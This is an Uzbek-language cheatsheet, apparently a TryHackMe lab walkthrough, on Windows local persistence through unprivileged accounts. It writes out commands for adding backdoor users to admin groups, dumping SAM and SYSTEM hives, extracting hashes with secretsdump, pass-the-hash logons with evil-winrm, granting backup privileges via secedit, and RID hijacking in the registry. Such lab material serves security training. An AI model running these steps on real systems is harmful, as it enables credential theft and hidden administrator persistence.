# Bo'rimiz, gohida qo'yni maskasini ham kiyishimizga to'g'ri keladi)
Bizda Admin huquqi bor backdoor user qoldirishimiz, keyingi ishalrni o'sha userlardan qilishimiz mumkin.


### Userni Guruhlarga qo'shish
Adminlar gruppasiga:
```
net localgroup administrators __username__ /add
```

BackUp gruppasiga:
```
net localgroup "Backup Operators" __username__ /add
```

Remote management group:
```
net localgroup "Remote Management Users" __username__ /add
```
Bu bizga masofadan ulanishga imkon yaratadi.


### Userga ulanish:
```
evil-winrm -i 10.10.187.100 -u thmuser1 -p Password321
```
Agar o'rnatilmagan bo'lsa, Arch uchun buyruq:
```
sudo pacman -S evil-winrm
```

Agar biz **evil-winrm**dan foydalanmasdan GUI tarzda ulanishni istasak muhitni quyidagicha qilishimiz kerak:
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```
ushbu buyruq bajarilgach qayta ulanishimiz kerak.


**evil-rm** bilan ulangach:
![Photo](https://github.com/akhatkulov/cheatsheets-for-windows/blob/main/Windows%20Local%20Persistence/Tampering%20With%20Unprivileged%20Accounts/whoami_group.png)
```
whoami /group
```



**evil-winrm** ga ulangach parollarni olish:

## 🎯 Maqsad:

Tizimda **Administrator huquqini olish** – oddiy foydalanuvchi orqali. Buning uchun biz quyidagilarni bajaramiz:

---

## 📦 1. **SAM va SYSTEM fayllarini zaxiralash (backup qilish)**

Windows’dagi **SAM (Security Account Manager)** fayli foydalanuvchilarning **parol xeshlarini** saqlaydi. Buni o‘qib olish uchun biz `SeBackupPrivilege`ga ega bo‘lishimiz kerak (bu huquq siz ilgari `thmuser2` ga bergansiz).

🔧 **Buyruqlar (Evil-WinRM ichida):**

```powershell
reg save hklm\system system.bak
reg save hklm\sam sam.bak
```

Bu harakatlar quyidagi fayllarni yaratadi:

* `system.bak` – SYSTEM reyestr bo‘limining nusxasi
* `sam.bak` – SAM reyestr bo‘limining nusxasi

---

## 📥 2. **Fayllarni o‘z mashinamizga yuklab olish**

```powershell
download system.bak
download sam.bak
```

> Agar yuklashda muammo bo‘lsa (sekinlik yoki blok), boshqa usullardan ham foydalanishingiz mumkin (masalan, `certutil`, `ftp`, `python3 -m http.server`, va h.k.).

---

## 🧠 3. **Parollarni olish (hashlarni chiqarib olish)**

Endi bizda `sam.bak` va `system.bak` fayllar bor. Bu fayllar yordamida parollarni xesh ko‘rinishida chiqarib olish mumkin. Buning uchun **`secretsdump.py`** dan foydalanamiz (bu Impacket to‘plamida bo‘ladi).

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

### 🔓 Natijada:

Siz foydalanuvchilarning xesh parollarini olasiz, masalan:

```
Administrator:500:...:1cea1d7e8899f69e89088c4cb4bbdaa3:::
```

> Bu yerda oxirgi `nt hash` – **Administrator foydalanuvchisining parol xeshi**

---

## 🗝️ 4. **Pass-the-Hash hujumi (xesh orqali tizimga kirish)**

Endi bizda `Administrator` foydalanuvchisining xeshi bor. Biz parolni bilmasak ham, **xesh bilan tizimga kira olamiz** – bu **Pass-the-Hash (PTH)** deyiladi.

```bash
evil-winrm -i 10.10.209.127 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

✅ Agar bu muvaffaqiyatli bo‘lsa, siz **Administrator sifatida tizimga kira olasiz**!

---

## 🔚 Xulosa

| Bosqich                       | Maqsad                                      |
| ----------------------------- | ------------------------------------------- |
| 1. SAM & SYSTEM ni zaxiralash | Parol xeshlarini olish                      |
| 2. Fayllarni yuklash          | Mahalliy tahlil qilish uchun                |
| 3. secretsdump.py ishlatish   | Xeshlarni chiqarib olish                    |
| 4. Pass-the-Hash              | Parol bilmasdan Administrator bo‘lib kirish |

---

## 🎯 Maqsad:

Foydalanuvchini hech qanday maxsus guruhga qo‘shmasdan turib unga quyidagi **privilege**larni beramiz:

* `SeBackupPrivilege` – istalgan faylni **o‘qish huquqi**, hatto unga ruxsat bo‘lmasa ham
* `SeRestorePrivilege` – istalgan faylga **yozish huquqi**, ruxsat so‘rovisiz

---

## 🛠️ Bosqichlar:

### ✅ 1. Hozirgi xavfsizlik siyosatini eksport qilish

```cmd
secedit /export /cfg C:\config.inf
```

> Bu `C:\config.inf` fayliga tizimdagi huquq (privilege) sozlamalarini yozadi.

---

### ✅ 2. Faylni oching va foydalanuvchini quyidagi joylarga qo‘shing

Faylni `notepad` yordamida oching:

```cmd
notepad C:\config.inf
```

### 🔽 Toping va **foydalanuvchini qo‘shing**, masalan `thmuser2`:

```
SeBackupPrivilege = *S-1-5-32-544,thmuser2
SeRestorePrivilege = *S-1-5-32-544,thmuser2
```

> Ehtiyot bo‘ling: mavjud foydalanuvchilar ro‘yxatini **ustiga yozmang**, faqat **vergul bilan ajratib yangi foydalanuvchini qo‘shing**.

---

### ✅ 3. Yangi konfiguratsiyani import qilish

```cmd
secedit /import /cfg C:\config.inf /db C:\config.sdb
```

### ✅ 4. Sozlamani tizimga qo‘llash:

```cmd
secedit /configure /db C:\config.sdb /cfg C:\config.inf
```

---

## ✅ 5. Kompyuterni qayta ishga tushiring yoki sessiyani yangilang

```cmd
shutdown /r /t 0
```

Yoki foydalanuvchi sessiyasini chiqib/kirib yangilang.

---

## 🧪 Tekshirish

Foydalanuvchi hozir **quyidagi huquqlarga ega**:

* Har qanday faylni o‘qiy oladi (shu jumladan `C:\Windows\System32\config\SAM`)
* Har qanday joyga yozish huquqiga ega

---

## 🔐 Eslatma:

Bu imtiyozlar **Windows xavfsizlik modeli**da juda muhim rol o‘ynaydi. Ulardan noto‘g‘ri foydalanish tizimni xavf ostiga qo‘yadi. Masalan, bu huquqlar orqali:

* `SAM` va `SYSTEM` fayllarini o‘qib, **xeshlar chiqarib olish** mumkin
* Admin parolini **Pass-the-Hash** bilan chetlab o‘tish mumkin

---

## 🧠 RID Hijacking nima?

Windows’da har bir foydalanuvchiga **SID** (Security Identifier) beriladi. SID ning oxirgi qismi — bu **RID** (Relative ID) bo‘lib, foydalanuvchini noyob qiladi:

| Foydalanuvchi | SID Oxiri (RID) |
| ------------- | --------------- |
| Administrator | `...-500`       |
| thmuser3      | `...-1010`      |

Agar biz `thmuser3` foydalanuvchisiga `500` RID ni berib yuborsak, u **Administrator huquqlari bilan** tizimga kiradi.

---

## 🛠 1. SID va RID’larni ko‘rish

```cmd
wmic useraccount get name,sid
```

Siz bu yerda barcha foydalanuvchilarning SID’larini ko‘rasiz.

---

## 🧬 2. RID Hijacking bajarish (Regedit orqali)

#### 🧨 Muhim: `HKLM\SAM` kalitini **oddiy foydalanuvchi yoki hatto administrator** ham o‘zgartira olmaydi. Faqat **NT AUTHORITY\SYSTEM** buni qila oladi.

---

### ✅ 3. `regedit`ni SYSTEM huquqida ishga tushirish

#### Buyruq:

```cmd
C:\tools\pstools\PsExec64.exe -i -s regedit
```

> Bu `regedit` dasturini **SYSTEM** foydalanuvchisi nomidan ishga tushiradi.

---

### 🔎 4. `thmuser3` ni topish

Regedit’da o‘ting:

```
HKLM\SAM\SAM\Domains\Account\Users\
```

Bu yerda har bir foydalanuvchi uchun bir kalit bor, lekin nomlar Raqamli HEX ko‘rinishida.

thmuser3 ning RID-si `1010` = **0x3F2** bo‘ladi, ya'ni siz quyidagi kalitni izlaysiz:

```
000003F2
```

---

### 🧬 5. `F` nomli qiymatni tahrirlash

O‘ng tomonda `F` deb nomlangan binary value bor. Uni ikki marta bosing.

* `F` qiymatidagi **0x30 offsetdagi 2 bayt** — bu foydalanuvchining **RID qiymati**
* `0x3F2` (1010) ning little endian ko‘rinishi: `F2 03`
* Buni **Administrator RID (500 = 0x01F4)** bilan almashtiring → `F4 01`

> Eslatma: 0x30 offsetda bo‘lgan qiymatni **aniq joydan** o‘zgartirish kerak. HEX editor ko‘rinishida buni ehtiyotkorlik bilan bajaring.

---

### ✅ 6. Endi `thmuser3` foydalanuvchisi `Administrator` huquqida tizimga kira oladi

---

## 💻 7. RDP orqali tizimga kirish

Sizga `thmuser3` foydalanuvchisi va paroli berilgan:

```
Username: thmuser3
Password: Password321
```

Kirish uchun:

### 🪟 Windows kompyuterdan:

```bash
mstsc.exe
```

Va IP manzilni kiriting. So‘ng:

* Username: `thmuser3`
* Password: `Password321`

---

### 🏁 8. Flag olish

RDP sessiyaga kirganingizdan so‘ng, quyidagicha bajaring:

```powershell
C:\flags\flag3.exe
```

Bu sizga **flag3** ni beradi.

---

## ✅ Xulosa

| Qadam | Harakat                                                          |
| ----- | ---------------------------------------------------------------- |
| 1     | `PsExec64` yordamida `regedit`ni SYSTEM huquqida ishga tushirish |
| 2     | `0x3F2` (thmuser3) kalitini topish                               |
| 3     | `F` qiymatidagi `0x30` offsetni `F4 01` bilan almashtirish       |
| 4     | RDP orqali tizimga kirish                                        |
| 5     | `flag3.exe` ni ishga tushirish                                   |

---
